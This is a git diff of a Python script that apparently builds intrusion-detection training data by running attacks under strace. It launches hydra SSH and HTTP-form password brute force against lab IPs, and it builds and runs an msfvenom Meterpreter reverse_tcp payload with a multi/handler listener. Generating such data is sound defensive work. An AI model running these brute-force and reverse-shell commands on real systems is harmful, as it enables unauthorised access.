@@ -8,6 +8,9 @@ import netifaces
 from pymetasploit3.msfrpc import MsfRpcClient
 import json
 import re
+import filecmp
+import random
+import pyautogui
 
 
 
@@ -19,8 +22,6 @@ def get_my_ip():
             if netifaces.AF_INET in addresses:
                 ipv4_address = addresses[netifaces.AF_INET][0]['addr']
                 return ipv4_address
-
-
 
 def execute_command(command):
     process = subprocess.Popen(command, shell=True)
@@ -37,23 +38,44 @@ def kill_process_by_port(port):
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass
 
+def compare_and_delete_files(folder_path):
+    file_list = os.listdir(folder_path)
+    num_files = len(file_list)
 
+    for i in range(num_files):
+        for j in range(i + 1, num_files):
+            file1 = os.path.join(folder_path, file_list[i])
+            file2 = os.path.join(folder_path, file_list[j])
+            
+            if not os.path.exists(file1):
+                print("File does not exist:", file1)
+                continue
 
+            if not os.path.exists(file2):
+                print("File does not exist:", file2)
+                continue
+
+            if filecmp.cmp(file1, file2):
+                print("Files are equal. Deleting:", file2)
+                os.remove(file2)
 
 
 def get_syscall_from_ssh():
     wordList = '/usr/share/wordlists/rockyou.txt'
-    ip = '10.10.10.16'
-    name = 'root'
-    output_file = 'output.txt'
+    ip_list = ['10.10.10.15','10.10.10.16', '10.10.10.13', '10.10.10.14','10.10.10.12']  # Liste d'adresses IP différentes
+    name_list = ['root', 'admin', 'user']  # Liste de noms d'utilisateur différents
     syscall_names_file_base = 'syscall_names.txt'
-    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
-    
 
-    for i in range(20):
+    for i in range(40):
+        ip = random.choice(ip_list)  # Sélectionne une adresse IP aléatoire
+        name = random.choice(name_list)  # Sélectionne un nom d'utilisateur aléatoire
 
-        cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -p {wordList} {ip} ssh".format(output_file=output_file, name=name, wordList=wordList, ip=ip)
-        cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(output_file=output_file, syscall_names_file_base=syscall_names_file_base)
+        output_file = 'output-{i}.txt'.format(i=i)  # Utilise un nom de fichier différent à chaque exécution
+
+        cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -p {wordList} {ip} ssh".format(
+            output_file=output_file, name=name, wordList=wordList, ip=ip)
+        cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(
+            output_file=output_file, syscall_names_file_base=syscall_names_file_base)
 
         # Exécutez la commande 1
         process = subprocess.Popen(cmd1, shell=True)
@@ -63,15 +85,16 @@ def get_syscall_from_ssh():
         process = subprocess.Popen(cmd2, shell=True)
         process.wait()
 
-        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))
+        replace_syscall_with_number(syscall_names_file_base, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))
 
-def get_syscall_from_hydra_http():
+def get_syscall_from_hydra_http(json_file):
     output_file = 'output.txt'
     syscall_names_file_base = 'syscall_names.txt'
-    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
-    
 
-    cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -P {wordList} {ip} http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V".format(output_file=output_file, name='molly', wordList='/usr/share/wordlists/rockyou.txt', ip='10.10.69.36')
+    name_list = ['root', 'admin', 'user']
+    name = random.choice(name_list)
+
+    cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -P {wordList} {ip} http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V".format(output_file=output_file, name=name, wordList='/usr/share/wordlists/rockyou.txt', ip='10.10.69.36')
     cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(output_file=output_file, syscall_names_file_base=syscall_names_file_base)
 
     # Exécutez la commande 1
@@ -82,104 +105,17 @@ def get_syscall_from_hydra_http():
     process = subprocess.Popen(cmd2, shell=True)
     process.wait()
 
-    replace_syscall_with_number(syscall_names_file_base, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-0.txt')
-
-    
-
-
-def get_syscall_from_Meterpreter():
-    # Dans un terminal load msgrpc [Pass=hugo]
-
-
-    client = MsfRpcClient('f6v3ltZ9', port=55552)
-    payload_name = "linux/x86/meterpreter/reverse_tcp"
-    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
-    payload_file = "meterpreterPayload"
-    ip = get_my_ip()
-   # Create a new console
-    console = client.consoles.console()
-
-    # Set up the listener
-    listener_options = {
-        'Payload': payload_name,
-        'LHOST': ip,
-        'LPORT': 55552
-    }
-    console.write('use exploit/multi/handler\n')
-    console.write(f'set {",".join(f"{k} {v}" for k, v in listener_options.items())}\n')
-    console.write('exploit -j\n')
-   
-    cmd4 = "strace -e trace=all -o output.txt ./{payload_file}; awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload_file=payload_file)
-    
-    # Exécuter la commande cmd4 dans un terminal
-    print("process2")
-    process = subprocess.Popen(cmd4, shell=True)
-
-    
-    replace_syscall_with_number('syscall_names.txt', f'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
-    
+    replace_syscall_with_number(syscall_names_file_base, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_12/UAD-Hydra-SSH-1-0.txt')
 
 
 
-
-
-
-
-'''
-def get_syscall_from_Meterpreter():
-    syscall_names_file_base = 'syscall_names.txt'
-    payload = "meterpreterPayload"
-    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
-    ip = get_my_ip()
-    print('your ip :',ip)
-
-
-
-    command = "msfvenom --list payloads | grep linux | grep meterpreter | awk '{print $1}'"
-    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    out, err = process.communicate()
-    payload_list = out.decode('utf-8').splitlines()
-
-    payload_list_cpu = [None] * len(payload_list)
-    for i in range(len(payload_list)):
-        kill_process_by_port(4444)
-        payload_list_cpu[i] = payload_list[i].split('/')[1]
-        print(payload_list_cpu[i])
-
-        cmd1 = "msfvenom -p {payload_list} LHOST={ip} LPORT=4444 --platform linux -a {payload_list_cpu} -f elf -o {payload}".format(ip=ip, payload=payload,payload_list_cpu=payload_list_cpu[i], payload_list=payload_list[i])
-        cmd2 = "chmod +x {payload}".format(payload=payload)
-
-        process = subprocess.Popen(cmd1, shell=True)
-        process.wait()
-
-        process = subprocess.Popen(cmd2, shell=True)
-        process.wait()
-
-        cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD {payload_list}; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip, payload_list=payload_list[i])
-        cmd4 = "strace -e trace=all -o output.txt ./{payload}; awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)
-        
-        # Exécuter la commande cmd3 dans un terminal
-        print(payload_list[i])
-        print("process1")
-        process = subprocess.Popen(cmd3, shell=True)
-
-        time.sleep(10)
-        # Exécuter la commande cmd4 dans un terminal
-        print("process2")
-        process = subprocess.Popen(cmd4, shell=True)
-       
-        
-        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-{i}.txt'.format(i=i))
-'''
-
-'''
 def get_syscall_from_Meterpreter():
     syscall_names_file_base = 'syscall_names.txt'
     payload = "meterpreterPayload"
     csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
 
     ip = get_my_ip()
-    print('your ip :',ip)
+    print('your ip:', ip)
 
     kill_process_by_port(4444)
     cmd1 = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 --platform linux -a x86 -f elf -o {payload}".format(ip=ip, payload=payload)
@@ -187,28 +123,21 @@ def get_syscall_from_Meterpreter():
     cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip)
     cmd4 = "strace -e trace=all -o output.txt ./{payload} && awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)
 
-    process = subprocess.Popen(cmd1, shell=True)
-    process = subprocess.Popen(cmd2, shell=True)
+    console1 = subprocess.Popen(['xterm', '-e', cmd1], shell=False)
+    console2 = subprocess.Popen(['xterm', '-e', cmd2], shell=False)
 
-        
-    # Exécuter la commande cmd3 dans un terminal
-    print("process1")
-    process1 = subprocess.Popen(cmd3, shell=True)
-    
-    time.sleep(20)
+    console3 = subprocess.Popen(['xterm', '-e', cmd3], shell=False)
+    time.sleep(10)
 
-    # Exécuter la commande cmd4 dans un terminal
-    print("process2")
-    process2 = subprocess.Popen(cmd4, shell=True)
-    
-    time.sleep(20)
-            
+    console4 = subprocess.Popen(['xterm', '-e', cmd4], shell=False)
+    time.sleep(60)  # Duration for capturing syscall data in seconds
+    console4.terminate()  # Stop the strace command
+
     replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
-'''
 
-def get_systemcall_from_your_computer():
+
+def get_systemcall_from_your_computer(json_file):
     syscall_regex = r'#define __NR(?:3264_)?(\w+)\s+(\d+)'
-    labelFile ='FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/syscalls.json'
 
     syscalls = {}
 
@@ -221,7 +150,7 @@ def get_systemcall_from_your_computer():
             syscall_number = int(match[1])
             syscalls[syscall_name] = syscall_number
 
-    with open(labelFile, 'w') as f:
+    with open(json_file, 'w') as f:
         json.dump(syscalls, f, indent=4)
 
 def replace_syscall_with_number(input_file, output_file):
@@ -241,10 +170,15 @@ def replace_syscall_with_number(input_file, output_file):
                 output_file.write(str(syscall_number) + ' ')
             else:
                 print('Syscall not found: ' + syscall_name)
-                
-            
 
-# get_syscall_from_ssh()
-# get_syscall_from_Meterpreter()
-get_systemcall_from_your_computer()
-get_syscall_from_hydra_http()
+
+
+if __name__ == "__main__":
+    json_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/syscalls.json'
+    ssh_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/'
+    # get_syscall_from_ssh()
+    # get_syscall_from_Meterpreter()
+    # get_systemcall_from_your_computer(json_file)
+    # get_syscall_from_hydra_http()
+    get_syscall_from_Meterpreter()
+    compare_and_delete_files(ssh_file)
